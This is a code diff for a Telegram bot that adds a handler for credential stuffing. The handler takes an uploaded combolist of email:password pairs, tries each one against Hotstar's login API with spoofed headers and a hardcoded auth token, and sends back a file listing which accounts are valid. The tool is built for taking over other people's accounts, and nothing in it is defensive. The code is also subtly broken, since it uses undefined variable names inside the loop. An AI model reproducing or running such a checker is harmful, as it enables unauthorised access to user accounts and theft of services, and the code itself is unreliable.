@@ -127,6 +127,69 @@ async def checker(bot: HotstarChecker, message: Message):
         await omk.edit("❌ --**Something Went Wrong!**-- ❌\n\n__Make sure you have put account in correct order, i.e, email:pass... retry again!__")
         
         
+@HotstarChecker.on_message(filters.private & filters.document, group=1)
+async def checker(bot: HotstarChecker, message: Message):  
+    file_type = message.document.file_name.split(".")[-1]  
+    if file_type != "txt":
+        await message.reply("Send the combolist in a .txt file...")
+        return
+    
+    if int(int(message.document.file_size)/1024) >= 400:
+        await message.reply("Bruhhhhh.... This file is toooooooo big!!!!!!!!!!!!!")
+        return   
+    
+    owo = await message.reply("__Checking... this might take upto a few minutes...__")
+    combos = await bot.download(message, "./")
+    with open(combos) as f:    
+        accs = f.read().splitlines()
+        hits = 0
+        bad = 0
+        hit_accs = "Hits Accounts:\n"
+        bad_accs = "Bad Accounts:\n"
+        try:
+            for one_acc in accs:
+                email, password = one_acc.split(":")
+                try:
+                    email, password = account.split(":")
+                    url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
+                    payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
+                    headers = {
+                        'content-type': 'application/json',
+                        'Referer': 'https://www.hotstar.com/',
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
+                        'Accept': '*/*',
+                        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Accept-Encoding': 'gzip, deflate',
+                        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
+                        }
+                    r = requests.post(url, data=json.dumps(payload), headers=headers)
+                    if r.status_code==200:
+                        hit_accs += f"\n- <code>{account}</code>: Valid ✅"             
+                        hits += 1
+                    else:
+                        bad_accs += f"\n- <code>{account}</code>: Invalid ❌"
+                        bad += 1
+                except:
+                    bad_accs += f"\n- <code>{account}</code>: Invalid Format ❌"
+                    bad += 1
+                    
+            cleanr = re.compile("<.*?>")
+            cleantext = re.sub(cleanr, "", hit_accs+"\n\n"+bad_accs)
+            with BytesIO(str.encode(cleantext)) as output:
+                output.name = "hotstar_result.txt"
+                await bot.send_document(
+                    chat_id=message.chat.id,
+                    document=output,
+                    file_name="hotstar_result.txt",
+                    caption=f"<b>Summary:</b>\n<b>Total Accs:</b> <code>{len(accs)}</code>\n<b>Hits:</b> <code>{hits}</code>\n<b>Bads:</b> <code>{bad}</code>\n\n<b>Checked by {message.from_user.mention}</b>\n<i>With ❤️ By @GodDrick</i>",
+                )
+            await omk.delete()  
+            if os.path.exists(combos):
+                os.remove(combos)                
+        except:
+            await owo.edit("❌ --**Something Went Wrong!**-- ❌\n\n__Make sure you have put account in correct order in the file, i.e, email:pass... retry again!__")
+        
 # dont let others add bot to chat coz that will make the bot spam it and get rate limited.... uhmm and ntg else, you can edit accordingly        
 @HotstarChecker.on_message(filters.new_chat_members)
 async def welcome(bot: HotstarChecker, message: Message):
